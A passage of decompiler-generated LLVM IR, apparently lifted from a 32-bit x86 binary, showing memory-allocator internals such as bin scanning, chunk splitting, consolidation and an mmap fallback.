  %v3_804fe6f = load i32, i32* %v2_804fe6f, align 4
  store i32 %v3_804fe6f, i32* @edx, align 4
  %v1_804fe72 = add i32 %v3_804fe6f, 12
  %v2_804fe72 = inttoptr i32 %v1_804fe72 to i32*
  %v3_804fe72 = load i32, i32* %v2_804fe72, align 4
  %v15_804fe72 = icmp eq i32 %v3_804fe72, %v4_804fe77
  %v1_804fe75 = icmp eq i1 %v15_804fe72, false
  br i1 %v1_804fe75, label %dec_label_pc_804fe7c, label %dec_label_pc_804fe77

dec_label_pc_804fe77:                             ; preds = %dec_label_pc_804fe6f
  %v1_804fe77 = add i32 %v3_804fe63, 8
  %v2_804fe77 = inttoptr i32 %v1_804fe77 to i32*
  %v3_804fe77 = load i32, i32* %v2_804fe77, align 4
  %v15_804fe77 = icmp eq i32 %v3_804fe77, %v4_804fe77
  br i1 %v15_804fe77, label %dec_label_pc_804fe81, label %dec_label_pc_804fe7c

dec_label_pc_804fe7c:                             ; preds = %dec_label_pc_804fe77, %dec_label_pc_804fe6f
  %v0_804fe7c = call i32 @abort()
  store i32 %v0_804fe7c, i32* %eax.global-to-local, align 4
  %v0_804fe81.pre = load i32, i32* @ebx, align 4
  %v0_804fe87.pre = load i32, i32* @ecx, align 4
  %v1_804fe87.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804fe81

dec_label_pc_804fe81:                             ; preds = %dec_label_pc_804fe77, %dec_label_pc_804fe7c
  %v1_804fe87 = phi i32 [ %v3_804fe6f, %dec_label_pc_804fe77 ], [ %v1_804fe87.pre, %dec_label_pc_804fe7c ]
  %v0_804fe87 = phi i32 [ %v3_804fe63, %dec_label_pc_804fe77 ], [ %v0_804fe87.pre, %dec_label_pc_804fe7c ]
  %v0_804fe81 = phi i32 [ %v1_804fe66, %dec_label_pc_804fe77 ], [ %v0_804fe81.pre, %dec_label_pc_804fe7c ]
  %v5_804fe83 = sub i32 %v0_804fe81, %v1_8050042
  store i32 %v5_804fe83, i32* %esi.global-to-local, align 4
  %v2_804fe87 = add i32 %v1_804fe87, 12
  %v3_804fe87 = inttoptr i32 %v2_804fe87 to i32*
  store i32 %v0_804fe87, i32* %v3_804fe87, align 4
  %v0_804fe8a = load i32, i32* @edx, align 4
  %v1_804fe8a = load i32, i32* @ecx, align 4
  %v2_804fe8a = add i32 %v1_804fe8a, 8
  %v3_804fe8a = inttoptr i32 %v2_804fe8a to i32*
  store i32 %v0_804fe8a, i32* %v3_804fe8a, align 4
  %v0_804fe8d = load i32, i32* %esi.global-to-local, align 4
  %v0_804fe90 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fe90 = add i32 %v0_804fe90, 8
  store i32 %v1_804fe90, i32* @ecx, align 4
  %tmp127 = icmp ult i32 %v0_804fe8d, 16
  br i1 %tmp127, label %dec_label_pc_8050391, label %dec_label_pc_804fe99

dec_label_pc_804fe99:                             ; preds = %dec_label_pc_804fe81
  %v2_804fe9d = add i32 %v0_804fe90, %v1_8050042
  store i32 %v2_804fe9d, i32* @edx, align 4
  %v1_804fea0 = or i32 %v1_8050042, 1
  store i32 %v1_804fea0, i32* %ebx.global-to-local, align 4
  %v2_804fea3 = add i32 %v0_804fe90, 4
  %v3_804fea3 = inttoptr i32 %v2_804fea3 to i32*
  store i32 %v1_804fea0, i32* %v3_804fea3, align 4
  %v0_804fea6 = load i32, i32* %esi.global-to-local, align 4
  %v1_804fea8 = or i32 %v0_804fea6, 1
  store i32 %v1_804fea8, i32* %eax.global-to-local, align 4
  %v0_804feab = load i32, i32* @edx, align 4
  %v1_804feab = load i32, i32* @ebp, align 4
  %v2_804feab = add i32 %v1_804feab, 8
  %v3_804feab = inttoptr i32 %v2_804feab to i32*
  store i32 %v0_804feab, i32* %v3_804feab, align 4
  %v0_804feae = load i32, i32* @edx, align 4
  %v1_804feae = load i32, i32* @ebp, align 4
  %v2_804feae = add i32 %v1_804feae, 12
  %v3_804feae = inttoptr i32 %v2_804feae to i32*
  store i32 %v0_804feae, i32* %v3_804feae, align 4
  %v0_804feb1 = load i32, i32* @edx, align 4
  %v1_804feb1 = add i32 %v0_804feb1, 8
  %v2_804feb1 = inttoptr i32 %v1_804feb1 to i32*
  store i32 ptrtoint (i32* @global_var_805e814.218 to i32), i32* %v2_804feb1, align 4
  %v0_804feb8 = load i32, i32* @edx, align 4
  %v1_804feb8 = add i32 %v0_804feb8, 12
  %v2_804feb8 = inttoptr i32 %v1_804feb8 to i32*
  store i32 ptrtoint (i32* @global_var_805e814.218 to i32), i32* %v2_804feb8, align 4
  %v0_804febf = load i32, i32* %eax.global-to-local, align 4
  %v1_804febf = load i32, i32* @edx, align 4
  %v2_804febf = add i32 %v1_804febf, 4
  %v3_804febf = inttoptr i32 %v2_804febf to i32*
  store i32 %v0_804febf, i32* %v3_804febf, align 4
  %v0_804fec2 = load i32, i32* %esi.global-to-local, align 4
  %v1_804fec2 = load i32, i32* @edx, align 4
  %v3_804fec2 = add i32 %v1_804fec2, %v0_804fec2
  %v4_804fec2 = inttoptr i32 %v3_804fec2 to i32*
  store i32 %v0_804fec2, i32* %v4_804fec2, align 4
  br label %dec_label_pc_8050396

dec_label_pc_804fecc:                             ; preds = %dec_label_pc_804fe60, %dec_label_pc_804fe50
  %v4_804fe77 = phi i32 [ %storemerge1.pre, %dec_label_pc_804fe50 ], [ %v3_804fe63, %dec_label_pc_804fe60 ]
  store i32 %v4_804fe77, i32* %eax.global-to-local, align 4
  %v12_804fecc = icmp eq i32 %v4_804fe77, %v2_804fe54
  %v1_804fece = icmp eq i1 %v12_804fecc, false
  br i1 %v1_804fece, label %dec_label_pc_804fe60, label %dec_label_pc_804fed0.loopexit

dec_label_pc_804fed0.loopexit:                    ; preds = %dec_label_pc_804fecc
  br label %dec_label_pc_804fed0

dec_label_pc_804fed0:                             ; preds = %dec_label_pc_804fed0.loopexit, %dec_label_pc_804fe42
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_804fed9 = add i32 %stack_var_-40.0.ph, 1
  %v2_804fedc = udiv i32 %v1_804fed9, 32
  store i32 %v2_804fedc, i32* @edi, align 4
  %v1_804fedf = mul i32 %v1_804fed9, 8
  %v2_804fedf = add i32 %v1_804fedf, ptrtoint (i32* @global_var_805e80c.216 to i32)
  store i32 %v2_804fedf, i32* %ebx.global-to-local, align 4
  %v1_804fee6 = urem i32 %v1_804fed9, 32
  %v2_804fee6 = icmp eq i32 %v1_804fee6, 0
  store i32 %v1_804fee6, i32* %ecx.global-to-local, align 4
  %v1_804fee9 = mul nuw nsw i32 %v2_804fedc, 4
  %v2_804fee9 = add i32 %v1_804fee9, ptrtoint (i32* @global_var_805eb14.220 to i32)
  %v3_804fee9 = inttoptr i32 %v2_804fee9 to i32*
  %v4_804fee9 = load i32, i32* %v3_804fee9, align 4
  store i32 %v4_804fee9, i32* %edx.global-to-local, align 4
  br i1 %v2_804fee6, label %.preheader, label %bb85

bb85:                                             ; preds = %dec_label_pc_804fed0
  %v5_804fef0 = shl i32 1, %v1_804fee6
  store i32 %v5_804fef0, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_804fed0, %bb85, %dec_label_pc_804ff31
  %v1_804fef2 = phi i32 [ %v1_804fef2.pre, %dec_label_pc_804ff31 ], [ %v4_804fee9, %bb85 ], [ %v4_804fee9, %dec_label_pc_804fed0 ]
  %v0_804fef6 = phi i32 [ %v0_804fef2.pre, %dec_label_pc_804ff31 ], [ %v5_804fef0, %bb85 ], [ 1, %dec_label_pc_804fed0 ]
  %tmp86 = icmp ule i32 %v0_804fef6, %v1_804fef2
  %v1_804fef6 = icmp eq i32 %v0_804fef6, 0
  %v1_804fef8 = icmp eq i1 %v1_804fef6, false
  %or.cond = and i1 %tmp86, %v1_804fef8
  br i1 %or.cond, label %dec_label_pc_804fef6.dec_label_pc_804ff26.preheader_crit_edge, label %dec_label_pc_804fefa.preheader

dec_label_pc_804fef6.dec_label_pc_804ff26.preheader_crit_edge: ; preds = %.preheader
  %v0_804ff2112.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ff26.preheader

dec_label_pc_804fefa.preheader:                   ; preds = %.preheader
  %v0_804fefa.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804fefa

dec_label_pc_804fefa:                             ; preds = %dec_label_pc_804fefa.preheader, %dec_label_pc_804ff04
  %v0_804fefa = phi i32 [ %v0_804fefa.pre, %dec_label_pc_804fefa.preheader ], [ %v1_804fefa, %dec_label_pc_804ff04 ]
  %v1_804fefa = add i32 %v0_804fefa, 1
  store i32 %v1_804fefa, i32* @edi, align 4
  %v6_804fefe = icmp ugt i32 %v1_804fefa, 2
  br i1 %v6_804fefe, label %dec_label_pc_804ffad.loopexit, label %dec_label_pc_804ff04

dec_label_pc_804ff04:                             ; preds = %dec_label_pc_804fefa
  %v1_804ff04 = mul i32 %v1_804fefa, 4
  %v2_804ff04 = add i32 %v1_804ff04, ptrtoint (i32* @global_var_805eb14.220 to i32)
  %v3_804ff04 = inttoptr i32 %v2_804ff04 to i32*
  %v4_804ff04 = load i32, i32* %v3_804ff04, align 4
  store i32 %v4_804ff04, i32* %edx.global-to-local, align 4
  %v1_804ff0b = icmp eq i32 %v4_804ff04, 0
  br i1 %v1_804ff0b, label %dec_label_pc_804fefa, label %dec_label_pc_804ff0f

dec_label_pc_804ff0f:                             ; preds = %dec_label_pc_804ff04
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_804ff16 = mul i32 %v1_804fefa, 256
  store i32 %v2_804ff16, i32* %eax.global-to-local, align 4
  %v1_804ff19 = add i32 %v2_804ff16, ptrtoint (i32* @global_var_805e80c.216 to i32)
  store i32 %v1_804ff19, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ff26.preheader

dec_label_pc_804ff26.preheader:                   ; preds = %dec_label_pc_804fef6.dec_label_pc_804ff26.preheader_crit_edge, %dec_label_pc_804ff0f
  %v0_804ff2112 = phi i32 [ %v1_804ff19, %dec_label_pc_804ff0f ], [ %v0_804ff2112.pre, %dec_label_pc_804fef6.dec_label_pc_804ff26.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_804ff0f ], [ %v0_804fef6, %dec_label_pc_804fef6.dec_label_pc_804ff26.preheader_crit_edge ]
  %v0_804ff38 = phi i32 [ %v4_804ff04, %dec_label_pc_804ff0f ], [ %v1_804fef2, %dec_label_pc_804fef6.dec_label_pc_804ff26.preheader_crit_edge ]
  %v2_804ff264 = and i32 %v0_804ff38, %esi.promoted
  %v3_804ff265 = icmp eq i32 %v2_804ff264, 0
  br i1 %v3_804ff265, label %dec_label_pc_804ff21, label %dec_label_pc_804ff2a

dec_label_pc_804ff21:                             ; preds = %dec_label_pc_804ff26.preheader, %dec_label_pc_804ff21
  %v2_804ff2414 = phi i32 [ %v2_804ff24, %dec_label_pc_804ff21 ], [ %esi.promoted, %dec_label_pc_804ff26.preheader ]
  %v0_804ff2113 = phi i32 [ %v1_804ff21, %dec_label_pc_804ff21 ], [ %v0_804ff2112, %dec_label_pc_804ff26.preheader ]
  %v1_804ff21 = add i32 %v0_804ff2113, 8
  %v2_804ff24 = mul i32 %v2_804ff2414, 2
  %v2_804ff26 = and i32 %v2_804ff24, %v0_804ff38
  %v3_804ff26 = icmp eq i32 %v2_804ff26, 0
  br i1 %v3_804ff26, label %dec_label_pc_804ff21, label %dec_label_pc_804ff26.dec_label_pc_804ff2a_crit_edge

dec_label_pc_804ff26.dec_label_pc_804ff2a_crit_edge: ; preds = %dec_label_pc_804ff21
  store i32 %v1_804ff21, i32* %ebx.global-to-local, align 4
  store i32 %v2_804ff24, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804ff2a

dec_label_pc_804ff2a:                             ; preds = %dec_label_pc_804ff26.dec_label_pc_804ff2a_crit_edge, %dec_label_pc_804ff26.preheader
  %v0_804ff3a = phi i32 [ %v2_804ff24, %dec_label_pc_804ff26.dec_label_pc_804ff2a_crit_edge ], [ %esi.promoted, %dec_label_pc_804ff26.preheader ]
  %v1_804ff54 = phi i32 [ %v1_804ff21, %dec_label_pc_804ff26.dec_label_pc_804ff2a_crit_edge ], [ %v0_804ff2112, %dec_label_pc_804ff26.preheader ]
  %v1_804ff2a = add i32 %v1_804ff54, 12
  %v2_804ff2a = inttoptr i32 %v1_804ff2a to i32*
  %v3_804ff2a = load i32, i32* %v2_804ff2a, align 4
  store i32 %v3_804ff2a, i32* @ecx, align 4
  %v12_804ff2d = icmp eq i32 %v3_804ff2a, %v1_804ff54
  %v1_804ff2f = icmp eq i1 %v12_804ff2d, false
  br i1 %v1_804ff2f, label %dec_label_pc_804ff45, label %dec_label_pc_804ff31

dec_label_pc_804ff31:                             ; preds = %dec_label_pc_804ff2a
  %v1_804ff33 = add i32 %v3_804ff2a, 8
  store i32 %v1_804ff33, i32* %ebx.global-to-local, align 4
  %v1_804ff36 = sub i32 -1, %v0_804ff3a
  store i32 %v1_804ff36, i32* %eax.global-to-local, align 4
  %v2_804ff38 = and i32 %v0_804ff38, %v1_804ff36
  store i32 %v2_804ff38, i32* %edx.global-to-local, align 4
  %v2_804ff3a = mul i32 %v0_804ff3a, 2
  store i32 %v2_804ff3a, i32* %esi.global-to-local, align 4
  %v1_804ff3c = load i32, i32* @edi, align 4
  %v2_804ff3c = mul i32 %v1_804ff3c, 4
  %v3_804ff3c = add i32 %v2_804ff3c, ptrtoint (i32* @global_var_805eb14.220 to i32)
  %v4_804ff3c = inttoptr i32 %v3_804ff3c to i32*
  store i32 %v2_804ff38, i32* %v4_804ff3c, align 4
  %v0_804fef2.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804fef2.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_804ff45:                             ; preds = %dec_label_pc_804ff2a
  %v1_804ff45 = add i32 %v3_804ff2a, 4
  %v2_804ff45 = inttoptr i32 %v1_804ff45 to i32*
  %v3_804ff45 = load i32, i32* %v2_804ff45, align 4
  store i32 %v3_804ff45, i32* %edx.global-to-local, align 4
  %v1_804ff48 = add i32 %v3_804ff2a, 12
  %v2_804ff48 = inttoptr i32 %v1_804ff48 to i32*
  %v3_804ff48 = load i32, i32* %v2_804ff48, align 4
  store i32 %v3_804ff48, i32* %eax.global-to-local, align 4
  %v1_804ff4b = and i32 %v3_804ff45, -4
  store i32 %v1_804ff4b, i32* @edx, align 4
  %v5_804ff50 = sub i32 %v1_804ff4b, %v1_8050042
  store i32 %v5_804ff50, i32* %esi.global-to-local, align 4
  store i32 %v3_804ff48, i32* %v2_804ff2a, align 4
  %v0_804ff57 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ff57 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ff57 = add i32 %v1_804ff57, 8
  %v3_804ff57 = inttoptr i32 %v2_804ff57 to i32*
  store i32 %v0_804ff57, i32* %v3_804ff57, align 4
  %v0_804ff5a = load i32, i32* %esi.global-to-local, align 4
  %tmp128 = icmp ult i32 %v0_804ff5a, 16
  br i1 %tmp128, label %dec_label_pc_804ff5f, label %dec_label_pc_804ff66

dec_label_pc_804ff5f:                             ; preds = %dec_label_pc_804ff45
  %v0_804ff5f = load i32, i32* @ecx, align 4
  %v1_804ff5f = load i32, i32* @edx, align 4
  %v2_804ff5f = add i32 %v0_804ff5f, 4
  %v3_804ff5f = add i32 %v2_804ff5f, %v1_804ff5f
  %v4_804ff5f = inttoptr i32 %v3_804ff5f to i32*
  %v5_804ff5f = load i32, i32* %v4_804ff5f, align 4
  %v6_804ff5f = or i32 %v5_804ff5f, 1
  store i32 %v6_804ff5f, i32* %v4_804ff5f, align 4
  br label %dec_label_pc_804ffa5

dec_label_pc_804ff66:                             ; preds = %dec_label_pc_804ff45
  store i32 %v1_8050042, i32* %eax.global-to-local, align 4
  %v0_804ff6f = load i32, i32* @ecx, align 4
  %v2_804ff6f = add i32 %v0_804ff6f, %v1_8050042
  store i32 %v2_804ff6f, i32* @edx, align 4
  %v1_804ff72 = load i32, i32* @ebp, align 4
  %v2_804ff72 = add i32 %v1_804ff72, 8
  %v3_804ff72 = inttoptr i32 %v2_804ff72 to i32*
  store i32 %v2_804ff6f, i32* %v3_804ff72, align 4
  %v0_804ff75 = load i32, i32* @edx, align 4
  %v1_804ff75 = load i32, i32* @ebp, align 4
  %v2_804ff75 = add i32 %v1_804ff75, 12
  %v3_804ff75 = inttoptr i32 %v2_804ff75 to i32*
  store i32 %v0_804ff75, i32* %v3_804ff75, align 4
  %v0_804ff78 = load i32, i32* @edx, align 4
  %v1_804ff78 = add i32 %v0_804ff78, 8
  %v2_804ff78 = inttoptr i32 %v1_804ff78 to i32*
  store i32 ptrtoint (i32* @global_var_805e814.218 to i32), i32* %v2_804ff78, align 4
  %v0_804ff7f = load i32, i32* @edx, align 4
  %v1_804ff7f = add i32 %v0_804ff7f, 12
  %v2_804ff7f = inttoptr i32 %v1_804ff7f to i32*
  store i32 ptrtoint (i32* @global_var_805e814.218 to i32), i32* %v2_804ff7f, align 4
  br i1 %v6_804fcfb, label %dec_label_pc_804ff8e, label %dec_label_pc_804ff88

dec_label_pc_804ff88:                             ; preds = %dec_label_pc_804ff66
  %v0_804ff88 = load i32, i32* @edx, align 4
  store i32 %v0_804ff88, i32* @global_var_805e810.217, align 16
  br label %dec_label_pc_804ff8e

dec_label_pc_804ff8e:                             ; preds = %dec_label_pc_804ff66, %dec_label_pc_804ff88
  %v4_804ff8e = or i32 %v1_8050042, 1
  %v0_804ff93 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_804ff8e, i32* %ebx.global-to-local, align 4
  %v1_804ff99 = or i32 %v0_804ff93, 1
  store i32 %v1_804ff99, i32* %eax.global-to-local, align 4
  %v1_804ff9c = load i32, i32* @ecx, align 4
  %v2_804ff9c = add i32 %v1_804ff9c, 4
  %v3_804ff9c = inttoptr i32 %v2_804ff9c to i32*
  store i32 %v4_804ff8e, i32* %v3_804ff9c, align 4
  %v0_804ff9f = load i32, i32* %esi.global-to-local, align 4
  %v1_804ff9f = load i32, i32* @edx, align 4
  %v3_804ff9f = add i32 %v1_804ff9f, %v0_804ff9f
  %v4_804ff9f = inttoptr i32 %v3_804ff9f to i32*
  store i32 %v0_804ff9f, i32* %v4_804ff9f, align 4
  %v0_804ffa2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ffa2 = load i32, i32* @edx, align 4
  %v2_804ffa2 = add i32 %v1_804ffa2, 4
  %v3_804ffa2 = inttoptr i32 %v2_804ffa2 to i32*
  store i32 %v0_804ffa2, i32* %v3_804ffa2, align 4
  br label %dec_label_pc_804ffa5

dec_label_pc_804ffa5:                             ; preds = %dec_label_pc_804ff5f, %dec_label_pc_804ff8e
  %v0_804ffa5 = load i32, i32* @ecx, align 4
  %v1_804ffa5 = add i32 %v0_804ffa5, 8
  store i32 %v1_804ffa5, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80503a7

dec_label_pc_804ffad.loopexit:                    ; preds = %dec_label_pc_804fefa
  br label %dec_label_pc_804ffad

dec_label_pc_804ffad:                             ; preds = %dec_label_pc_804ffad.loopexit, %dec_label_pc_804fcb5, %dec_label_pc_804fcbd
  %v0_804ffad = load i32, i32* @global_var_805e80c.216, align 4
  store i32 %v0_804ffad, i32* @ebx, align 4
  %v1_804ffb7 = add i32 %v1_8050042, 16
  store i32 %v1_804ffb7, i32* @esi, align 4
  %v1_804ffba = add i32 %v0_804ffad, 4
  %v2_804ffba = inttoptr i32 %v1_804ffba to i32*
  %v3_804ffba = load i32, i32* %v2_804ffba, align 4
  %v1_804ffc1 = and i32 %v3_804ffba, -4
  store i32 %v1_804ffc1, i32* %ecx.global-to-local, align 4
  %v7_804ffc4 = icmp ult i32 %v1_804ffc1, %v1_804ffb7
  br i1 %v7_804ffc4, label %dec_label_pc_804ffe4, label %dec_label_pc_804ffc8

dec_label_pc_804ffc8:                             ; preds = %dec_label_pc_804ffad
  %v2_804ffcc = add i32 %v0_804ffad, %v1_8050042
  store i32 %v2_804ffcc, i32* @edx, align 4
  %v1_804ffcf = or i32 %v1_8050042, 1
  store i32 %v1_804ffcf, i32* %eax.global-to-local, align 4
  store i32 %v2_804ffcc, i32* @global_var_805e80c.216, align 4
  store i32 %v1_804ffcf, i32* %v2_804ffba, align 4
  %v0_804ffdb = load i32, i32* %ecx.global-to-local, align 4
  %v5_804ffdb = sub i32 %v0_804ffdb, %v1_8050042
  store i32 %v5_804ffdb, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050337

dec_label_pc_804ffe4:                             ; preds = %dec_label_pc_804ffad
  %v0_804ffe4 = load i32, i32* @global_var_805eb3c.221, align 4
  store i32 %v0_804ffe4, i32* %edx.global-to-local, align 4
  %v0_804ffea = load i8, i8* @global_var_805e7e0.215, align 32
  %v1_804ffea = and i8 %v0_804ffea, 2
  %v2_804ffea = icmp eq i8 %v1_804ffea, 0
  br i1 %v2_804ffea, label %dec_label_pc_8050018, label %dec_label_pc_804fff3

dec_label_pc_804fff3:                             ; preds = %dec_label_pc_804ffe4
  store i32 ptrtoint (i8* @global_var_805e7e0.215 to i32), i32* %stack_var_-92, align 4
  %v2_804fffb = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_805e7e0.215 to i32*))
  store i32 ptrtoint (i8* @global_var_805e7e0.215 to i32), i32* @ebx, align 4
  %v1_8050005 = add i32 %v1_8050042, -7
  store i32 %v1_8050005, i32* %eax.global-to-local, align 4
  store i32 %v1_8050005, i32* %stack_var_-92, align 4
  %v1_8050009 = call i32 @malloc(i32 %v1_8050005)
  store i32 %v1_8050009, i32* %eax.global-to-local, align 4
  store i32 %v1_8050009, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80503a7

dec_label_pc_8050018:                             ; preds = %dec_label_pc_804ffe4
  %v1_8050018 = add i32 %v0_804ffe4, -1
  store i32 %v1_8050018, i32* @ecx, align 4
  store i32 %v1_8050042, i32* @ebx, align 4
  %v1_8050023 = load i32, i32* @global_var_805eb2c.222, align 4
  %v7_8050023 = icmp ult i32 %v1_8050042, %v1_8050023
  br i1 %v7_8050023, label %dec_label_pc_80500e5, label %dec_label_pc_805002f

dec_label_pc_805002f:                             ; preds = %dec_label_pc_8050018
  %v0_805002f = load i32, i32* @global_var_805eb30.223, align 16
  store i32 %v0_805002f, i32* %eax.global-to-local, align 4
  %v1_8050034 = load i32, i32* @global_var_805eb34.224, align 4
  %v5_805003a = icmp slt i32 %v0_805002f, %v1_8050034
  br i1 %v5_805003a, label %dec_label_pc_8050040, label %dec_label_pc_80500e5

dec_label_pc_8050040:                             ; preds = %dec_label_pc_805002f
  %v2_8050042 = add i32 %v1_8050042, 10
  %v3_8050042 = add i32 %v2_8050042, %v0_804ffe4
  %v1_8050046 = sub i32 0, %v0_804ffe4
  store i32 %v1_8050046, i32* %eax.global-to-local, align 4
  %v2_8050048 = and i32 %v3_8050042, %v1_8050046
  store i32 %v2_8050048, i32* @ebx, align 4
  %tmp129 = icmp ugt i32 %v2_8050048, %v1_8050042
  br i1 %tmp129, label %dec_label_pc_8050054, label %dec_label_pc_80500e5

dec_label_pc_8050054:                             ; preds = %dec_label_pc_8050040
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8050061 = call i32 @mmap(i32 0, i32 %v2_8050048, i32 3, i32 34, i32 0, i32 0, i32 %v1_8050018, i32 %v1_8050018)
  store i32 %v8_8050061, i32* %eax.global-to-local, align 4
  store i32 %v8_8050061, i32* @edx, align 4
  %v10_805006b = icmp eq i32 %v8_8050061, -1
  br i1 %v10_805006b, label %dec_label_pc_8050054.dec_label_pc_80500e5_crit_edge, label %dec_label_pc_8050070

dec_label_pc_8050054.dec_label_pc_80500e5_crit_edge: ; preds = %dec_label_pc_8050054
  %v0_80500e5.pre = load i32, i32* @global_var_805e80c.216, align 4
  br label %dec_label_pc_80500e5

dec_label_pc_8050070:                             ; preds = %dec_label_pc_8050054
  %v1_8050072 = urem i32 %v8_8050061, 8
  %v2_8050072 = icmp eq i32 %v1_8050072, 0
  store i32 %v1_8050072, i32* @ecx, align 4
  br i1 %v2_8050072, label %dec_label_pc_805008a, label %dec_label_pc_8050077

dec_label_pc_8050077:                             ; preds = %dec_label_pc_8050070
  %v0_805007c = load i32, i32* @ebx, align 4
  %v2_805007e = sub nsw i32 8, %v1_8050072
  store i32 %v2_805007e, i32* %eax.global-to-local, align 4
  %v2_8050080 = add i32 %v2_805007e, %v8_8050061
  store i32 %v2_8050080, i32* @edx, align 4
  %v2_8050082 = sub i32 %v0_805007c, %v2_805007e
  store i32 %v2_8050082, i32* %esi.global-to-local, align 4
  %v2_8050084 = inttoptr i32 %v2_8050080 to i32*
  store i32 %v2_805007e, i32* %v2_8050084, align 4
  br label %dec_label_pc_8050092

dec_label_pc_805008a:                             ; preds = %dec_label_pc_8050070
  %v1_805008a = inttoptr i32 %v8_8050061 to i32*
  store i32 0, i32* %v1_805008a, align 4
  br label %dec_label_pc_8050092

dec_label_pc_8050092:                             ; preds = %dec_label_pc_8050077, %dec_label_pc_805008a
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_8050077 ], [ @ebx, %dec_label_pc_805008a ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_8050092 = or i32 %storemerge, 2
  %v1_8050095 = load i32, i32* @edx, align 4
  %v2_8050095 = add i32 %v1_8050095, 4
  %v3_8050095 = inttoptr i32 %v2_8050095 to i32*
  store i32 %v1_8050092, i32* %v3_8050095, align 4
  %v0_8050098 = load i32, i32* @global_var_805eb30.223, align 16
  %v1_805009d = add i32 %v0_8050098, 1
  store i32 %v1_805009d, i32* %eax.global-to-local, align 4
  store i32 %v1_805009d, i32* @global_var_805eb30.223, align 16
  %v1_80500a3 = load i32, i32* @global_var_805eb38.225, align 8
  %v7_80500a9 = icmp sgt i32 %v1_805009d, %v1_80500a3
  br i1 %v7_80500a9, label %dec_label_pc_80500ab, label %dec_label_pc_80500b0

dec_label_pc_80500ab:                             ; preds = %dec_label_pc_8050092
  store i32 %v1_805009d, i32* @global_var_805eb38.225, align 8
  br label %dec_label_pc_80500b0

dec_label_pc_80500b0:                             ; preds = %dec_label_pc_8050092, %dec_label_pc_80500ab
  %v0_80500b0 = load i32, i32* @global_var_805eb44.226, align 4
  %v1_80500b5 = load i32, i32* @ebx, align 4
  %v2_80500b5 = add i32 %v1_80500b5, %v0_80500b0
  store i32 %v2_80500b5, i32* %eax.global-to-local, align 4
  store i32 %v2_80500b5, i32* @global_var_805eb44.226, align 4
  %v1_80500bc = load i32, i32* @global_var_805eb50.227, align 16
  %tmp130 = icmp ugt i32 %v2_80500b5, %v1_80500bc
  br i1 %tmp130, label %dec_label_pc_80500c4, label %dec_label_pc_80500c9

dec_label_pc_80500c4:                             ; preds = %dec_label_pc_80500b0
  store i32 %v2_80500b5, i32* @global_var_805eb50.227, align 16
  br label %dec_label_pc_80500c9

dec_label_pc_80500c9:                             ; preds = %dec_label_pc_80500b0, %dec_label_pc_80500c4
  %v1_80500c9 = load i32, i32* @global_var_805eb48.228, align 8
  %v2_80500c9 = add i32 %v1_80500c9, %v2_80500b5
  store i32 %v2_80500c9, i32* %eax.global-to-local, align 4
  %v1_80500cf = load i32, i32* @global_var_805eb54.229, align 4
  %tmp131 = icmp ugt i32 %v2_80500c9, %v1_80500cf
  br i1 %tmp131, label %dec_label_pc_80500db, label %dec_label_pc_804fd2c

dec_label_pc_80500db:                             ; preds = %dec_label_pc_80500c9
  store i32 %v2_80500c9, i32* @global_var_805eb54.229, align 4
  br label %dec_label_pc_804fd2c

dec_label_pc_80500e5:                             ; preds = %dec_label_pc_8050040, %dec_label_pc_8050054.dec_label_pc_80500e5_crit_edge, %dec_label_pc_805002f, %dec_label_pc_8050018
  %v0_80500e5 = phi i32 [ %v0_80500e5.pre, %dec_label_pc_8050054.dec_label_pc_80500e5_crit_edge ], [ %v0_804ffad, %dec_label_pc_805002f ], [ %v0_804ffad, %dec_label_pc_8050040 ], [ %v0_804ffad, %dec_label_pc_8050018 ]
  store i32 %v0_80500e5, i32* %eax.global-to-local, align 4
  %v1_80500ee = add i32 %v0_80500e5, 4
  %v2_80500ee = inttoptr i32 %v1_80500ee to i32*
  %v3_80500ee = load i32, i32* %v2_80500ee, align 4
  %v1_80500f8 = and i32 %v3_80500ee, -4
  %v2_80500f8 = icmp eq i32 %v1_80500f8, 0
  store i32 %v1_80500f8, i32* @ebp, align 4
  %v1_80500fb = load i32, i32* @global_var_805eb28.230, align 8
  %v2_80500fb = add i32 %v1_80500fb, %v1_804ffb7
  store i32 %v2_80500fb, i32* %eax.global-to-local, align 4
  %v0_8050101 = load i8, i8* @global_var_805eb40.231, align 64
  %v1_8050101 = urem i8 %v0_8050101, 2
  %v2_8050101 = icmp eq i8 %v1_8050101, 0
  br i1 %v2_8050101, label %dec_label_pc_805010c, label %dec_label_pc_805010a

dec_label_pc_805010a:                             ; preds = %dec_label_pc_80500e5
  %v2_805010a = sub i32 %v2_80500fb, %v1_80500f8
  store i32 %v2_805010a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805010c

dec_label_pc_805010c:                             ; preds = %dec_label_pc_80500e5, %dec_label_pc_805010a
  %v0_8050110 = phi i32 [ %v2_80500fb, %dec_label_pc_80500e5 ], [ %v2_805010a, %dec_label_pc_805010a ]
  %v5_8050110 = add i32 %v0_8050110, %v1_8050018
  store i32 %v5_8050110, i32* %eax.global-to-local, align 4
  %v1_8050114 = sub i32 0, %v0_804ffe4
  store i32 %v1_8050114, i32* @edx, align 4
  %v2_805011c = and i32 %v5_8050110, %v1_8050114
  store i32 %v2_805011c, i32* @esi, align 4
  %tmp88 = icmp slt i32 %v2_805011c, 1
